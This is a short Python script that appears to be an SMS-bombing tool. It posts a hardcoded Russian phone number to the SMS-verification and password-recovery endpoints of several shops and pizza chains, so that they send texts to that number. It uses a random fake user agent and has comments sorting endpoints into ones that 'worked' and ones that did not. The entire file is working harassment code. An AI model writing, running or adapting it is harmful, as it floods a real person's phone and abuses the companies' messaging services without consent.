import requests, fake_useragent

num = '79200622537'
num2 = '89200622537'
user = fake_useragent.UserAgent().random
headers = {'user_agent': user}
# didnt worked apis
vsk_api = "https://shop.vsk.ru/ajax/auth/postSmsX/"
pan_pizza_api = "https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode"
_pizza_api = "https://sushiwok.ru/user/phone/validate"
# worked apis
papa_job_pizza_api = "https://api.papajohns.ru/user/confirmation-code/send"
try:
    response = requests.post(_pizza_api, headers=headers,
                             json={"phone": "+79200622537", "numbers": "4"})
    print("Успешно отправлено!")
    print(response)
except:
    print("БАНАНАН")
try:
    response = requests.post(papa_job_pizza_api, headers=headers,
                             json={'phone': "+" + num, 'type': "recovery_password", 'channel': "sms",
                                   'platform': "web", 'city_id': "1"})
    print("Успешно отправлено!")
    print(response)
except:
    print("БАНАНАН")
